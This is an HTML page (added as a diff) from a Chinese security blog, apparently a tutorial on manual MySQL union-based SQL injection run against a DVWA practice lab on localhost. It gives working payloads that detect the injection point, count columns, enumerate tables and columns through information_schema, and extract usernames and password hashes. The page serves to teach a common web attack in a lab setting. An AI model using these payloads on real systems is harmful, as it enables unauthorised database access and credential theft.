@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>MySQL⼿注之联合查询注⼊ | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">MySQL⼿注之联合查询注⼊</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 23, 2020&nbsp;&nbsp;17:53:05</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="MySQL联合查询注入原理"><a href="#MySQL联合查询注入原理" class="headerlink" title="MySQL联合查询注入原理"></a>MySQL联合查询注入原理</h2><p><code>union select</code> 联合查询，即合并（取交集，结果中没有重复⾏）前后两个查询；前提是前后查询视图必须拥有相同数量的列，列也必需拥有相同的数据类型。</p>
+<h2 id="Union联合查询注入基本流程"><a href="#Union联合查询注入基本流程" class="headerlink" title="Union联合查询注入基本流程"></a>Union联合查询注入基本流程</h2><h3 id="1、判断是否存在注入"><a href="#1、判断是否存在注入" class="headerlink" title="1、判断是否存在注入"></a>1、判断是否存在注入</h3><p>方法一：单引号法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注入点&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>方法二：逻辑法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>
+
+<p>方法三：运算法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1</span><br><span class="line">-0</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、猜解表名"><a href="#2、猜解表名" class="headerlink" title="2、猜解表名"></a>2、猜解表名</h3><p>常见的表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">user</span><br><span class="line">admin_user</span><br><span class="line">system</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、猜解字段数"><a href="#3、猜解字段数" class="headerlink" title="3、猜解字段数"></a>3、猜解字段数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by xx</span><br></pre></td></tr></table></figure>
+
+<h3 id="4、猜解字段名"><a href="#4、猜解字段名" class="headerlink" title="4、猜解字段名"></a>4、猜解字段名</h3><p>常见的字段名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username</span><br><span class="line">password</span><br><span class="line">user</span><br><span class="line">pass</span><br></pre></td></tr></table></figure>
+
+<h3 id="5、获取数据"><a href="#5、获取数据" class="headerlink" title="5、获取数据"></a>5、获取数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3... from 表名</span><br></pre></td></tr></table></figure>
+
+<h2 id="MySQL手注之联合查询注入详解"><a href="#MySQL手注之联合查询注入详解" class="headerlink" title="MySQL手注之联合查询注入详解"></a>MySQL手注之联合查询注入详解</h2><p>测试环境：<code>dvwa</code></p>
+<p>注入点：<a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/sqli/">http://127.0.0.1/dvwa/vulnerabilities/sqli/</a></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1515.png" alt="图片"></p>
+<p>靶场注入语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1、判断是否注入"><a href="#1、判断是否注入" class="headerlink" title="1、判断是否注入"></a>1、判断是否注入</h3><p>我们可以判断是否存在注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">判断注入语句：</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">这样我们的 and 就逃逸出来了（为了闭合）：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1516.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1 返回正常！</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">判断注入语句：</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">这样我们的 and 就逃逸出来了（为了闭合）：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1517.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2 返回不正常说明存在注入！很显然这是一个`字符型`注入！因为它用引号包裹起来了！</span><br></pre></td></tr></table></figure>
+
+<p>PS：字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<h3 id="2、猜解字段数"><a href="#2、猜解字段数" class="headerlink" title="2、猜解字段数"></a>2、猜解字段数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注入的语句：</span><br><span class="line">1&#x27; order by 1#</span><br><span class="line">带入进查询就是这样的：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; order by 1#&#x27;;&quot;;</span><br><span class="line">注释：# 就是注释后面的内容，这样我们的 order by 就逃逸出来了！</span><br></pre></td></tr></table></figure>
+
+<p>我们先 <code>order by 3</code> 发现错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1518.png" alt="图片"></p>
+<p><code>order by 2</code> 发现正常：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1519.png" alt="图片"></p>
+<p>说明字段数有<code>2</code>个！</p>
+<h3 id="3、联合查询"><a href="#3、联合查询" class="headerlink" title="3、联合查询"></a>3、联合查询</h3><h4 id="获取当前数据库和数据库用户名："><a href="#获取当前数据库和数据库用户名：" class="headerlink" title="获取当前数据库和数据库用户名："></a>获取当前数据库和数据库用户名：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">1&#x27; union select database(),user() #</span><br><span class="line">带到数据库执行就是：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select database(),user() #&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line"> database()	是一个mysql的函数，意思是查询当前数据库名</span><br><span class="line"> user() 意思是查询当前数据库的用户名</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1520.png" alt="图片"></p>
+<p>查询出来发现当前数据库名是：<code>dvwa</code>，数据库用户名是 <code>root</code> ！</p>
+<h4 id="获取当前的数据库版本和操作系统："><a href="#获取当前的数据库版本和操作系统：" class="headerlink" title="获取当前的数据库版本和操作系统："></a>获取当前的数据库版本和操作系统：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">1&#x27; union select version(),@@version_compile_os #</span><br><span class="line">带到数据库执行就是：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select version(),@@version_compile_os #&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">version() 是一个函数，意思是查询当前数据库的版本信息</span><br><span class="line">@@version_compile_os 是一个函数，意思是查询操作系统信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1521.png" alt="图片"></p>
+<p>有上图可见，我们的<code>MySQL</code>数据库版本为：<code>5.5.53</code>，而我们的操作系统信息是<code>win32</code>，说明是<code>windows</code>操作系统！</p>
+<p>为什么要获取MySQL的版本？</p>
+<p>因为当MySQL的版本<code>⼩于4.0</code>时，是不⽀持<code>union select</code>联合查询的；当MySQL版本<code>⼤于 5.0</code>时，有个默认数据库<code>information_schema</code>，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表， 表栏的数据类型与访问权限等。该数据库拥有⼀个名为 <code>tables</code> 的数据表，该表包含两个字段 <code>table_name</code> 和 <code>table_schema</code>，分别记录 <code>DBMS</code> 中的存储的表名和表名所在的数据库。</p>
+<h3 id="4、获取表名"><a href="#4、获取表名" class="headerlink" title="4、获取表名"></a>4、获取表名</h3><p>因为我们查询出来了<code>MySQL</code>的版本是<code>大于5.0</code>的，那么我们就可以利用联合查询 <code>union select</code> 来对他的数据库下的表名进行查询！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">1&#x27; union select table_name,table_schema from information_schema.tables where table_schema= &#x27;dvwa&#x27;#</span><br><span class="line">带入数据库查询执行就是：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select table_name,table_schema from information_schema.tables where table_schema= &#x27;dvwa&#x27;#&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">information_schema.tables	information_schema下的tables的数据表包含了两个字段：tables_name、tables_schema,分别记录dbms中的存储的表名所在的数据库</span><br><span class="line"> where table_schema= &#x27;dvwa&#x27;  这里使用了where条件语句指定了查询的数据库名为：dvwa</span><br><span class="line"> 总的语句的意思就是，查询dvwa这个数据库名下的所有表名</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1522.png" alt="图片"></p>
+<p>由上图可见，我们查询出来 <code>dvwa</code> 数据库下有两个表：<code>guestbook</code>、<code>users</code> 两张表！很显然我们的敏感信息就在 <code>users</code> 这张表里！</p>
+<h3 id="5、获取表中的列名"><a href="#5、获取表中的列名" class="headerlink" title="5、获取表中的列名"></a>5、获取表中的列名</h3><p>我们得到的信息有，数据库名：<code>dvwa</code>，表名：<code>users</code>，接下来就查表<code>users</code>下的列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line"> 1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br><span class="line">带入数据库查询执行就是：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27; 1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">group_concat(column_name)	group_concat()这个函数是吧所有的信息一次性列举出来，返回一个字符串结果！而他里面的column_name就是我们所有列名</span><br><span class="line">information_schema.columns	这个表里存放的是我们数据库中所有的列名信息</span><br><span class="line">where table_name=&#x27;users&#x27;	使用where条件来指定我们要获取users表下的列</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1523.png" alt="图片"></p>
+<p>由上图可见，我们得到了所有的列名：<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>user</code>,<code>password</code>,<code>avatar</code>,<code>last_login</code>,<code>failed_login</code></p>
+<p>其中铭感的列名就是 <code>user</code>、<code>password</code>，我们就查询他们两个列名下的数据！</p>
+<h3 id="6、获取数据"><a href="#6、获取数据" class="headerlink" title="6、获取数据"></a>6、获取数据</h3><p>到了最后一步，我们得到的信息有：数据库名：<code>dvwa</code>、表名：<code>users</code>、列名：<code>user</code>、<code>passoword</code></p>
+<p>这个时候我们就可以来使用联合查询 <code>union select</code> 来查询 <code>user</code> 、 <code>password</code> 列里的数据了！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">1&#x27; union select user,password from users#</span><br><span class="line">带入数据库查询执行就是：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select user,password from users#&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">union select	将多个select的语句的结果合并到一个结果集中里！因为我们注入语句前面就已经是一个查询语句了：SELECT first_name, last_name FROM users WHERE user_id =，而我们使用 union select 就可以吧前面和后面的SQL语句合并为一个SQL语句来进行查询！</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1524.png" alt="图片"></p>
+<p>由上图可见，我们获取到了他们的账号和加密的密码！至此MySQL手工注入之联合查询就到此为止！</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/03/23/MySQL-1/">http://example.com/2020/03/23/MySQL-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"># 漏洞原理</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/MySQL/"># MySQL</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/18/MySQL-2/">MySQL手注之报错注入</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/23/SQL-MsSQL-6/">Microsoft SQL Server手注之db_owner权限处理</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
